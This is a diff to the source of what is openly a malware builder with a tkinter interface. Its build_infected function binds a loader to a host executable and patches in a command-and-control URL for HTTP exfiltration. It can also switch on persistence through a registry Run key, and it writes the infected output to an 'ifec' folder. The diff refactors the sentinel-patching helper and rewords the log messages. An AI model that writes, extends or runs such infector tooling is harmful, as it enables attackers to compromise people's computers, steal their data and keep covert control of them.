@@ -15,7 +15,7 @@ import json, os, shutil, struct, subprocess, sys, threading, time
 import tkinter as tk
 from tkinter import filedialog, ttk
 
-from peutil import find_sentinel
+from peutil import patch_ready
 
 HERE = os.path.dirname(os.path.abspath(__file__))
 BIN  = os.path.join(HERE, "bin")
@@ -321,9 +321,10 @@ def build_infected(host_path, c2_url="", persist=False, log=print):
             host_bytes = real_host
     # Patch C2 URL into the payload embedded in the loader
     if c2_url:
-        sidx = find_sentinel(loader_bytes, C2_SENTINEL, 256)
+        sidx = patch_ready(loader_bytes, C2_SENTINEL, 256)
         if sidx == -1:
-            log("[!] C2 sentinel not found in loader -- no HTTP exfiltration")
+            log("[!] C2 slot not patchable -- loader already carries a URL, "
+                "or the C2 sentinel is gone (no HTTP exfiltration)")
         else:
             url_bytes = c2_url.encode("utf-8")[:255]
             url_padded = url_bytes + b"\0" * (256 - len(url_bytes))
@@ -331,12 +332,12 @@ def build_infected(host_path, c2_url="", persist=False, log=print):
             log("[+] C2 URL embedded: %s" % c2_url)
     # Patch persistence sentinel if enabled
     if persist:
-        pidx = find_sentinel(loader_bytes, PERSIST_SENTINEL, 8)
+        pidx = patch_ready(loader_bytes, PERSIST_SENTINEL, 8)
         if pidx != -1:
             loader_bytes = loader_bytes[:pidx] + PERSIST_ENABLE + loader_bytes[pidx+8:]
             log("[+] persistence: enabled (registry Run key)")
         else:
-            log("[!] persistence sentinel not found in loader")
+            log("[!] persistence flag not patchable (sentinel gone, or already enabled)")
     out = loader_bytes + host_bytes + struct.pack("<I", len(host_bytes)) + MAGIC
     # output to ifec/
     IFEC = os.path.join(HERE, "ifec")
